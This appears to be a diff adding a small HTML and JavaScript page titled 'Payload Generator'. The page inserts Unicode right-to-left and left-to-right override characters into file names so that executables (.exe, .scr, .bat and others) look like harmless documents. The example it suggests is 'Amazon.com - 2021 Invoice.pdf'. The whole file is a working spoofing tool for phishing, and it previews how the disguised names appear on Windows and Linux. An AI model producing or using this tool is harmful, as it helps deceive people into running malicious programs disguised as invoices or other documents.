@@ -1,0 +1,121 @@
+<!--<button onclick='document.getElementById("textbox").value=document.getElementById("textbox").value+ "\u202e" '>[RTLO]</button>
+<button onclick='document.getElementById("textbox").value=document.getElementById("textbox").value+ "\u202d" '>[LTRO]</button>
+<button onclick='alert(JSON.stringify(document.getElementById("textbox").value))'>[Alert]</button>-->
+
+
+
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <style>
+        .top {
+            margin-top: 10vh;
+        }
+    </style>
+    <script>
+        ltro = "\u202d";
+        rtlo = "\u202e";
+
+        function output(s, extension) {
+            $("#windows-show").html(s)
+
+            $("#windows-hide").html(s.substr(0, s.length - extension.length))
+            console.log(s.substr(0, s.length - extension.length))
+
+            $("#linux").html(s)
+        }
+
+        function rev(xx) {
+            return xx.split('').reverse().join('')
+        }
+
+        function doSomeMagic() {
+            let name = $("#payloadname").val()
+            let extension = $("#extension").val()
+            if (name.length > 1 && extension.length > 1 && extension.includes(".")) {
+                if (name.includes(extension)) {
+                    arr = name.split(extension)
+                    if (name.startsWith(extension)) {
+                        res = rtlo + rev(arr[1]) + ltro + extension
+                        output(res, extension)
+                    } else if (name.endsWith(extension)) {
+                        res = ltro + arr[0] + extension
+                        output(res, extension)
+                    } else {
+                        res = arr[0] + rtlo + rev(arr[1]) + ltro + extension
+                        output(res, extension)
+                    }
+                } else if (name.includes(rev(extension))) {
+                    arr = name.split(rev(extension))
+                    if (name.startsWith(rev(extension))) {
+                        res = rtlo + rev(arr[1]) + extension
+                        output(res, extension)
+                    } else if (name.endsWith(rev(extension))) {
+                        res = arr[0] + rtlo + extension
+                        output(res, extension)
+                    } else {
+                        res = arr[0] + rtlo + rev(arr[1]) + (extension)
+                        output(res, extension)
+                    }
+                } else {
+                    alert('Extension doesn\'t match.')
+                }
+            } else {
+                alert('File extension not contain . or blank field')
+            }
+
+
+            // Include option to hide filename in export (because Windows defaults).
+        }
+    </script>
+    <!-- Bootstrap CSS -->
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://bootswatch.com/darkly/" />
+    <title>Payload Generator</title>
+</head>
+
+<body>
+
+    <div class="container top">
+        <h1>Fetch me a payload!</h1>
+
+        <div class="form-group">
+            <input type="text" class="form-control" id="payloadname" aria-describedby="" placeholder="Payload Name">
+            <small class="form-text text-muted">Amazon.com - 2021 Invoice.pdf</small>
+        </div>
+        <div class="form-group">
+            <input type="text" class="form-control" id="extension" aria-describedby="" placeholder="Extension">
+            <small class="form-text text-muted">(.bat, .exe, .cmd, .com, .lnk, .pif, .scr, .vb, .vbe, .vbs, .wsh)</small>
+        </div>
+        <button type="button" class="btn btn-primary" onclick="doSomeMagic()">Generate</button>
+    </div>
+    <br>
+    <div class="container">
+        <div class="alert alert-primary">
+            <strong>Windows (Show Extensions)</strong><br>
+            <pre><span id="windows-show">...</span></pre>
+        </div>
+        <div class="alert alert-secondary">
+            <strong>Windows (Hide Extensions)</strong><br>
+            <pre><span id="windows-hide">...</span></pre>
+        </div>
+        <div class="alert alert-dark">
+            <strong>Linux (WSL)</strong><br>
+            <pre><span id="linux">...</span></pre>
+        </div>
+    </div>
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+
+</html>
